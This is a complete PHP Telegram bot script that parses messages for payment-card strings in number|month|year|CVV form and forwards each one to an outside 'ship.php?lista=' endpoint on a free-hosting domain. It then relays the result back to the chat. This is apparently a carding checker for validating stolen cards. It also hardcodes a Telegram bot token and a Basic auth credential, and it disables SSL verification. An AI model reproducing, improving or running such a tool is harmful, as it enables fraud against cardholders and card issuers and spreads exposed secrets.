
<?php
// === CONFIGURATION === //
$telegramBotToken = "8310617057:AAH22wb_CR4JI_pGWh7bkjiL1hP6UrcgSaM"; // Set your token
$authHeader = "Authorization: Basic MTEyNTI0NTE6NjAtZGF5ZnJlZXRyaWFs";
$targetBaseUrl = "http://shivatejax07-001-site1.mtempurl.com/ship.php/?lista=";

// === GET TELEGRAM UPDATE === //
$update = json_decode(file_get_contents("php://input"), true);
$messageText = $update['message']['text'] ?? '';
$chatId = $update['message']['chat']['id'] ?? null;

if (!$messageText || !$chatId) {
    http_response_code(400);
    exit("No valid message.");
}

// === REGEX MATCH === //
// Supports 16|1-2|2-4|3 pattern
preg_match_all('/\b\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}\b/', $messageText, $matches);
$cards = $matches[0] ?? [];

if (empty($cards)) {
    sendTelegram($chatId, "❌ No valid card format found.");
    exit;
}

// === PROCESS EACH CARD === //
foreach ($cards as $card) {
    $url = $targetBaseUrl . urlencode($card);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [$authHeader]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $apiResponse = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        sendTelegram($chatId, "❌ Error for `$card`: $error");
    } else {
        sendTelegram($chatId, "✅ Response for `$card`:\n$apiResponse");
    }
}

// === FUNCTION TO SEND TELEGRAM MESSAGE === //
function sendTelegram($chatId, $message) {
    global $telegramBotToken;

    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
